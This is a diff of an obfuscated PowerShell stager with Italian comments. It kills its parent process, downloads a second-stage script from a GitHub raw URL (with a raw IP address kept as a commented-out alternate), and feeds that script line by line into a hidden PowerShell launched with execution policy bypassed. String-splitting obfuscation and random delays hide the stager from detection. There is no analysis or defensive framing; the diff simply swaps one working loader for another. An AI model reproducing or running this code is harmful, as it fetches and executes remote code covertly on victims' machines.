@@ -1,7 +1,40 @@
-S''t''art-P''roce''ss $PSHOME\powershell.exe -ArgumentList {
-$0431e9d378d3462f93513a7b95eae7b0= (Get-CimInstance Win32_Process -Filter "ProcessId = $PID").ParentProcessId;
-S''to''p''-''P''r''o''c''e''ss -Id $0431e9d378d3462f93513a7b95eae7b0 -Force;
-${g}=[char[]](New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere/second.txt');
-ie''x(${g}-join'');
-&{S''ta''r''t-S''l''e''e''p -s 1.2;
-$d61a3455b9a64aaab05c755b40fa87cd='SilentlyContinue'}} -WindowStyle Hidden
+# 🔥 KIL''L CMD PARENT PROCESS
+$43e6d8941e994875ab5412f3b973d021= (Get-WmiObject Win32_Process -Filter "ProcessId=$PID" | S''e''l''e''c''t -Expand ParentProcessId) 2>$null
+if ($43e6d8941e994875ab5412f3b973d021) { Stop''-Pr''o''c''e''s''s -Id $43e6d8941e994875ab5412f3b973d021 -Force -ErrorAction SilentlyContinue }
+
+# $b77d2952d90347f2a6468e9d0aff5d1d = "http://151.61.206.201/second.txt";
+$b77d2952d90347f2a6468e9d0aff5d1d= "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere/second.txt";
+$da48068809eb4dfbac840aa87b36f09c= (New-Object Net.WebClient).DownloadString($b77d2952d90347f2a6468e9d0aff5d1d);
+$137d917e53f942fc8b637d527d59209f= $da48068809eb4dfbac840aa87b36f09c -split "`r?`n";
+
+$890483db25f04e8aabaf27dad92df2ef= Ne''w-O''bj''ect System.Diagnostics.ProcessStartInfo;
+$890483db25f04e8aabaf27dad92df2ef.FileName = "powershell.exe";
+$890483db25f04e8aabaf27dad92df2ef.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass";
+$890483db25f04e8aabaf27dad92df2ef.UseShellExecute = $false;
+$890483db25f04e8aabaf27dad92df2ef.RedirectStandardInput = $true;
+$890483db25f04e8aabaf27dad92df2ef.RedirectStandardOutput = $true;
+$890483db25f04e8aabaf27dad92df2ef.RedirectStandardError = $true;
+$890483db25f04e8aabaf27dad92df2ef.CreateNoWindow = $true;
+
+$d4208739afcb42f7a7217d520bd9392c= [System.Diagnostics.Process]::Start($890483db25f04e8aabaf27dad92df2ef);
+S''t''a''r''t''-''S''l''e''e''p -Seconds 1.2;
+
+# 1. INIT error handling
+$d4208739afcb42f7a7217d520bd9392c.StandardInput.WriteLine('$d703458ad89e43539cbff604550a9cb4 = "SilentlyContinue"');
+$d4208739afcb42f7a7217d520bd9392c.StandardInput.Flush();
+S''t''a''r''t''-S''l''ee''p -Milliseconds 200;
+
+# 2. INVIO script line-by-line
+foreach ($line in $137d917e53f942fc8b637d527d59209f) {
+    if ($line.Trim()) {
+        $d4208739afcb42f7a7217d520bd9392c.StandardInput.WriteLine($line.TrimEnd());
+        $d4208739afcb42f7a7217d520bd9392c.StandardInput.Flush();
+        Sta''rt-''Slee''p -Milliseconds (50..150 | Ge''t''-''R''andom);
+    }
+}
+
+# 🔥 CRITICO: TRIGGER FINALE - ESEGUE tutto!
+$d4208739afcb42f7a7217d520bd9392c.StandardInput.WriteLine('');  # Nuova riga
+$d4208739afcb42f7a7217d520bd9392c.StandardInput.Flush();
+S''ta''rt-''S''l''eep -Milliseconds 500;
+
